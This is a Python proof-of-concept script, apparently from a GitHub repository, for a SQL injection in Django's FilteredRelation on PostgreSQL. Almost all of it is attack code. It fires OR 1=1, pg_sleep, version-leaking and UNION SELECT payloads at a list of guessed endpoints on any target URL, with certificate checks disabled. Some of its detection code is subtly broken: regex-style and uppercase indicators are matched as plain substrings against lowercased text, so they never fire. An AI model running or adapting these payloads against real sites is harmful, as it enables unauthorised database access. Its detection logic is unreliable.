# CVE-2025-13372-poc.py
# Github: https://github.com/Ashwesker/Blackash-CVE-2025-13372
# Django FilteredRelation + PostgreSQL SQL Injection PoC
# Vulnerable: Django <= 5.2.8 / <= 5.1.14 / <= 4.2.26
# Fixed in: 5.2.9, 5.1.15, 4.2.27
# Use only on targets you own or have explicit permission for!

import requests
import urllib.parse
import sys
from requests.packages.urllib3 import disable_warnings
disable_warnings()

if len(sys.argv) != 2:
    print("Usage: python3 CVE-2025-13372-poc.py http://target.com")
    sys.exit(1)

target = sys.argv[1].rstrip("/")

# Common payloads that trigger PostgreSQL errors or delays
payloads = [
    "') OR 1=1-- ",
    "'); SELECT pg_sleep(7)--",           # Time-based (7 sec delay = vuln)
    "'); SELECT version()--",             # Leaks PostgreSQL version
    "' UNION SELECT NULL,version(),NULL--",
    "1' AND (SELECT 1 FROM PG_SLEEP(7))--"
]

print("[+] CVE-2025-13372 PoC – Django FilteredRelation SQLi")
print(f"[+] Target: {target}\n")

for payload in payloads:
    enc = urllib.parse.quote(payload)

    # Common endpoints/parameters that may use FilteredRelation + alias()/annotate()
    paths = [
        f"/search/?alias={enc}",
        f"/api/filter/?col={enc}",
        f"/filter/?field={enc}",
        f"/reports/?column={enc}",
        f"/advanced/?sort={enc}",
        f"/admin/lookup/?q={enc}",
        f"/?order={enc}"
    ]

    for path in paths:
        url = target + path
        try:
            print(f"[*] Testing: {url[:80]}{'...' if len(url)>80 else ''}", end="")
            r = requests.get(url, timeout=15, verify=False, allow_redirects=True)

            # PostgreSQL error indicators
            indicators = [
                "syntax error at or near",
                "column .* does not exist",
                "unterminated quoted string",
                "SQLSTATE",
                "relation .* does not exist",
                "django.db.utils.ProgrammingError"
            ]

            body = r.text.lower()
            if any(ind in body for ind in indicators):
                print(" → VULNERABLE! (PostgreSQL error)")
                print(f"    Payload : {payload}")
                print(f"    URL     : {url}\n")
                sys.exit(0)

            # Time-based detection
            if "pg_sleep" in payload.lower() and r.elapsed.total_seconds() >= 6:
                print(" → VULNERABLE! (Time delay detected)")
                print(f"    Delay   : {r.elapsed.total_seconds():.2f} seconds")
                print(f"    Payload : {payload}")
                sys.exit(0)

            print(" → no indicator")

        except requests.exceptions.Timeout:
            if "pg_sleep" in payload.lower():
                print(" → VULNERABLE! (Request timed out – pg_sleep likely worked)")
                sys.exit(0)
        except:
            print(" → request failed")

print("\n[-] Not vulnerable or correct endpoint not found.")
print("[i] Tip: Use Burp/ZAP to find parameters named alias, column, field, sort, etc.")
print("[i] Then test manually with the payloads above.")
